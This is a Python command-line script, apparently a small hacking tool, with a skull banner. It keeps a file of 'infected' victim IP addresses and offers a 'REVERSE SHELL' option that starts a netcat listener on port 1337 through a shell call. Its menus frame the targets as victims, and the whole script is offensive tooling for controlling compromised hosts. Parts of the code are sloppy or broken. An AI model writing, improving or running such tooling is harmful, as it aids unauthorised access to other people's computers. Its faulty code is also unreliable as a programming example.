#!/usr/bin/python


import os, sys, ipaddress

try:
	color = "\033[1;35m"
	normal = '\033[1;0m'
	def head():
		os.system('clear')
		banner = """
		               ...
		             ;::::;
		           ;::::; :;
		         ;:::::'   :;
		        ;:::::;     ;.
		       ,:::::'       ;           OOOO
		       ::::::;       ;          OOOOOO
		       ;:::::;       ;         OOOOOOOO
		      ,;::::::;     ;'         / OOOOOOO
		    ;:::::::::`. ,,,;.        /  / DOOOOOO
		  .';:::::::::::::::::;,     /  /     DOOOO
		 ,::::::;::::::;;;;::::;,   /  /        DOOO
		;`::::::`'::::::;;;::::: ,#/  /          DOOO
		:`:::::::`;::::::;;::: ;::#  /            DOOO
		::`:::::::`;:::::::: ;::::# /              DOO
		`:`:::::::`;:::::: ;::::::#/               DOO
		 :::`:::::::`;; ;:::::::::##                OO
		 ::::`:::::::`;::::::::;:::#                OO
		 `:::::`::::::::::::;'`:;::#                O
		  `:::::`::::::::;' /  / `:#
		   ::::::`:::::;'  /  /   `#
		"""
		print(color+banner)
		print(normal)
		print(" [ + ]---------------------------------------[ + ]")
		print(" [ > ]                @lur1el                [ < ]")
		print(" [ + ]---------------------------------------[ + ]")

	def menu():
		print(" [ 1 ] INSERT THE IP ADDRESS TO INFECT")
		print(" [ 2 ] HOSTS INFECTED")
		print(" [ 3 ] EXIT")
		print
		choice_menu = int(input("\n [ o ] ENTER AN OPTION: "))
		if (choice_menu  == 1):
			head()
			print (" [ SELECTED ]  INSERT THE IP ADDRESS  [ SELECTED ]\n")
			while True: 
				file_ipappend = open("hosts.txt","a")
				string_ip = str(input(" [ o ] IP ADDRESS OF VICTIM: "))
				formated_ip = ipaddress.ip_address(string_ip)
				if (str(formated_ip) in open("hosts.txt").read()):
					head()
					print (" [ X ] IP ADDRESS ALREADY EXIST IN HOSTS INFECTED FILE\n")
				else:
					file_ipappend.write(str(formated_ip))
					file_ipappend.write(str(("\n")))
					file_ipappend.close()
					break
			head()
			menu()
		def num_lines():
			lines = 0
			with open("hosts.txt", 'r') as f:
				for line in f:
					lines += 1
			return(lines)

		def file_hosts():
			list_ips = []
			with open("hosts.txt", 'r') as f_listips:
				list_ips = f_listips.readlines()
			file_ipread = open("hosts.txt", "r")
			contents = file_ipread.read()
			for i in range(num_lines()):
				print (" [",(i+1),"] "+list_ips[i].rstrip())

		def nc_server(ip_target):
			head()
			port = 1337
			print(" [ * ] LISTENING ON ANY " + str(port))
			os.system("nc -nlvp " + str(port) + " " + str(ip_target))

		def list_formated(ip_selected):
			list_ips = []
			with open("hosts.txt", 'r') as f_listips:
				list_ips = f_listips.readlines()
			file_ipread = open("hosts.txt", "r")
			contents = file_ipread.read()
			list_ips_formated = [elem.strip().split('\n') for elem in list_ips]
			return(list_ips_formated[ip_selected])

		def abort():
			head()
			print(" [ ~ ]                 ABORTED               [ ~ ]\n")
			sys.exit(0)

		def menu_hosts():
			head()
			print (" [ SELECTED ]      HOSTS INFECTED     [ SELECTED ] ")
			file_hosts()
			choice_hosts = int(input("\n [ o ] SELECT THE HOST TARGET: "))
		
		


			if (choice_hosts <= num_lines()):
				while True:
					head()
					ip_selected = (int(choice_hosts-1))
					ip_target = ''.join(list_formated(ip_selected))
					print(" [SELECTED]         "+ip_target+"        [SELECTED]")
					print(" [ 1 ] REVERSE SHELL")
					print(" [ 2 ] BACK")
					print(" [ 3 ] EXIT")
					choice_hosts_option = int(input("\n [ o ] ENTER AN OPTION: "))
					

					if (choice_hosts_option == 1):
						nc_server(ip_target)


					if (choice_hosts_option == 2):
						menu()
						break
						choice_hosts = int(input("\n [ o ] SELECT THE HOST TARGET: "))
					if (choice_hosts_option == 3):
						abort()
						break
						
					break
			else:
				head()
				print (" [ ~ ]   PLEASE SELECT A NUMBER AVAILABLE    [ ~ ]")
				menu()




		if (choice_menu  == 2):
			menu_hosts()
		if (choice_menu  == 3):
			head()
			print(" [ ~ ]                 ABORTED               [ ~ ]\n")
		if (choice_menu  > 3 or choice_menu  < 1):
			head()
			print (" [ ~ ]   PLEASE SELECT A NUMBER AVAILABLE    [ ~ ]")
			menu()
			
	def main():
		head()
		menu()

	if __name__ == '__main__':
	    main()
except(KeyboardInterrupt):
	print("\n [ ~ ]                 ABORTED               [ ~ ]\n")
	sys.exit(0)
